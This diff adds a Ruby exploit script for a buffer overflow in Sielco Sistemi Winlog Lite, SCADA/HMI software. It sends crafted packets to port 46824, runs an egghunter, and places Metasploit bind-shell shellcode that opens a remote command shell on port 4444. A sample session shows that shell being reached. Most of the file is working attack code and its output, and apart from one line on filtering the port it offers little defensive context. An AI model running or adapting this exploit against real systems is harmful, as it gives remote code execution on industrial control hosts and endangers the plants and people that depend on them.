@@ -1,0 +1,133 @@
+#!/usr/bin/ruby
+
+# Exploit Title: Sielco Sistemi Winlog Buffer Overflow <= v2.07.16
+# Date: 05.06.2012
+# Exploit Author: m1k3
+# Vendor Homepage: http://www.sielcosistemi.com/en/download/public/winlog_lite.html
+# Software Link: http://www.sielcosistemi.com/en/download/public/winlog_lite.html
+# Version: 2.07.14
+# Tested on: Windows XP SP2
+
+#---------------------------------------------
+#
+# Sielco Sistemi Winlog Buffer Overflow <= v2.07.16
+# - Buffer overflow vulnerability
+# Date: 05.06.2012
+#
+# ---------------------------------------------
+#
+# - Description
+# Winlog Lite is the entry level version of the SCADA/HMI software Winlog Pro offered by Sielco Sistemi to allow an evaluation of the potentiality and the simplicity of use of the package; Winlog Lite is also a powerful and low cost solution for creation of small supervisory applications.
+# Winlog Lite makes available most of development tools and functions provided by the Winlog Pro software package, but limits the possibility to develop and to run applications up to a max of 24 tags. Winlog Lite does not include Symbol Factory library and web support.
+# Source: http://www.sielcosistemi.com/en/download/public/winlog_lite.html
+#
+# - buffer overflow vulnerability
+#
+# The vulnerability can be triggered by sending a specially crafted request to port 46824. 
+#
+# - Solution
+#
+# No known solution available. Filter access to port 46824.
+#
+# - Credits
+#
+# The vulnerability was discovered by m1k3 (@s3cur1ty_de)
+#  - devnull#at#s3cur1ty#dot#de
+#  - http://www.s3cur1ty.de
+#
+# Thx to @corelanc0d3r and @offsectraining for their great work :)
+#
+# - Timeline
+#
+# 04.06.2012 - Vulnerability discovered
+# 05.06.2012 - Public disclosure
+#
+# - Reference
+#
+# Download vulnerable software: http://www.sielcosistemi.com/en/download/public/winlog_lite.html
+# Offensive Security Training: http://www.offensive-security.com/
+# Corelan Training: https://www.corelan-training.com/
+
+# - Exploit:
+
+#root@bt:~/msf-scripts# ruby runtime-exploit-01.rb
+#placing the shellcode
+#sleeping ...
+#kicking ...
+#buffer length: 261
+#root@bt:~/msf-scripts# netcat -v 10.8.28.37 4444
+#10.8.28.37: inverse host lookup failed: Unknown server error : Connection timed out
+#(UNKNOWN) [10.8.28.37] 4444 (?) open
+#Microsoft Windows XP [Version 5.1.2600]
+#(C) Copyright 1985-2001 Microsoft Corp.
+#
+#C:\Documents and Settings\All Users\Application Data\Winlog Lite\Projects\Ceramics Kiln\Template>
+#
+# Important:
+# -> the reliability of your exploit depends on that path ...
+# if you choose another default project or you start another project this path ist not reliable anymore 
+# you can choose the default project on the installation. I have used Ceramics Kiln
+
+require 'socket'
+
+port = "46824"
+host = "10.8.28.37"
+
+s = TCPSocket.open(host,port)
+
+sleep(0.5)
+
+egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+egghunter << "\xef\xb8\x77\x6f\x6f\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+# msfpayload windows/shell_bind_tcp R | msfencode -t ruby
+#[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
+shellcode =
+"\xdb\xc8\xd9\x74\x24\xf4\x5b\xba\x45\x76\x08\xf1\x33\xc9" +
+"\xb1\x56\x31\x53\x18\x83\xeb\xfc\x03\x53\x51\x94\xfd\x0d" +
+"\xb1\xd1\xfe\xed\x41\x82\x77\x08\x70\x90\xec\x58\x20\x24" +
+"\x66\x0c\xc8\xcf\x2a\xa5\x5b\xbd\xe2\xca\xec\x08\xd5\xe5" +
+"\xed\xbc\xd9\xaa\x2d\xde\xa5\xb0\x61\x00\x97\x7a\x74\x41" +
+"\xd0\x67\x76\x13\x89\xec\x24\x84\xbe\xb1\xf4\xa5\x10\xbe" +
+"\x44\xde\x15\x01\x30\x54\x17\x52\xe8\xe3\x5f\x4a\x83\xac" +
+"\x7f\x6b\x40\xaf\xbc\x22\xed\x04\x36\xb5\x27\x55\xb7\x87" +
+"\x07\x3a\x86\x27\x8a\x42\xce\x80\x74\x31\x24\xf3\x09\x42" +
+"\xff\x89\xd5\xc7\xe2\x2a\x9e\x70\xc7\xcb\x73\xe6\x8c\xc0" +
+"\x38\x6c\xca\xc4\xbf\xa1\x60\xf0\x34\x44\xa7\x70\x0e\x63" +
+"\x63\xd8\xd5\x0a\x32\x84\xb8\x33\x24\x60\x65\x96\x2e\x83" +
+"\x72\xa0\x6c\xcc\xb7\x9f\x8e\x0c\xdf\xa8\xfd\x3e\x40\x03" +
+"\x6a\x73\x09\x8d\x6d\x74\x20\x69\xe1\x8b\xca\x8a\x2b\x48" +
+"\x9e\xda\x43\x79\x9e\xb0\x93\x86\x4b\x16\xc4\x28\x23\xd7" +
+"\xb4\x88\x93\xbf\xde\x06\xcc\xa0\xe0\xcc\x7b\xe7\x2e\x34" +
+"\x28\x80\x52\xca\xdf\x0c\xda\x2c\xb5\xbc\x8a\xe7\x21\x7f" +
+"\xe9\x3f\xd6\x80\xdb\x13\x4f\x17\x53\x7a\x57\x18\x64\xa8" +
+"\xf4\xb5\xcc\x3b\x8e\xd5\xc8\x5a\x91\xf3\x78\x14\xaa\x94" +
+"\xf3\x48\x79\x04\x03\x41\xe9\xa5\x96\x0e\xe9\xa0\x8a\x98" +
+"\xbe\xe5\x7d\xd1\x2a\x18\x27\x4b\x48\xe1\xb1\xb4\xc8\x3e" +
+"\x02\x3a\xd1\xb3\x3e\x18\xc1\x0d\xbe\x24\xb5\xc1\xe9\xf2" +
+"\x63\xa4\x43\xb5\xdd\x7e\x3f\x1f\x89\x07\x73\xa0\xcf\x07" +
+"\x5e\x56\x2f\xb9\x37\x2f\x50\x76\xd0\xa7\x29\x6a\x40\x47" +
+"\xe0\x2e\x70\x02\xa8\x07\x19\xcb\x39\x1a\x44\xec\x94\x59" +
+"\x71\x6f\x1c\x22\x86\x6f\x55\x27\xc2\x37\x86\x55\x5b\xd2" +
+"\xa8\xca\x5c\xf7"
+
+puts "placing the shellcode"
+buffer = "\x41" * 2000
+buffer << "wootwoot" #egg
+buffer << "\x90"
+buffer << shellcode
+buffer << "\x90" * 2000
+print "buffer length: #{buffer.length}\r\n"
+s.puts(buffer)
+
+puts "sleeping ..."
+sleep(5)
+
+puts "kicking ..."
+buffer = "\x41" * 20 + "\x14" * 10 + "\x41" * 167
+buffer << "\xdf\x53\x51\x40" #EIP -> Jmp ESP - Vclx40.bpl - 0x405153df
+buffer << "\x90" 
+buffer << egghunter
+buffer << "\x90" * (59 - egghunter.length)
+print "buffer length: #{buffer.length}\r\n"
+s.puts(buffer)
